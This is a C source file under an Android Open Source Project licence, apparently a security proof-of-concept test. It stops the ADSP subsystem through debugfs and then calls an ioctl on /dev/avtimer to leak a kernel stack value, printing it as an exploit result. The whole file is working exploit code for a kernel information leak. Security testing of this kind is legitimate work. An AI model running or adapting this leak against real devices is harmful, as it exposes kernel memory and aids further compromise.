/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <sys/wait.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>

#define MAJOR_NUM 100

#define IOCTL_GET_AVTIMER_TICK _IOR(MAJOR_NUM, 0, uint64_t)

static int subsystem_get(void) {
  int fd, ret;
  unsigned long buf;
  char *cmd[3] = {"get", "put", "restart"};

  fd = open("/sys/kernel/debug/msm_subsys/adsp", O_RDWR);
  if (fd == -1) {
    return -1;
  }

  ret = write(fd, cmd[0], sizeof("get"));

  close(fd);

  return 0;
}

static int subsystem_put(void) {
  int fd, ret;
  unsigned long buf;
  char *cmd[3] = {"get", "put", "restart"};

  fd = open("/sys/kernel/debug/msm_subsys/adsp", O_RDWR);
  if (fd == -1) {
    return -1;
  }

  ret = write(fd, cmd[1], sizeof("put"));

  close(fd);

  return 0;
}

int main(void) {
  int fd, ret = 0, cmd;
  unsigned long avtimer_tick = 0;

  fd = open("/dev/avtimer", O_RDWR);
  if (fd == -1) {
    return -1;
  }

  subsystem_put();

  cmd = IOCTL_GET_AVTIMER_TICK;
  ret = ioctl(fd, cmd, &avtimer_tick);

  printf("[+] get 64 bits kernel stack information: 0x%lx\n", avtimer_tick);
  printf("[+] restore subsystem\n\n");

  subsystem_get();

  close(fd);

  return 0;
}
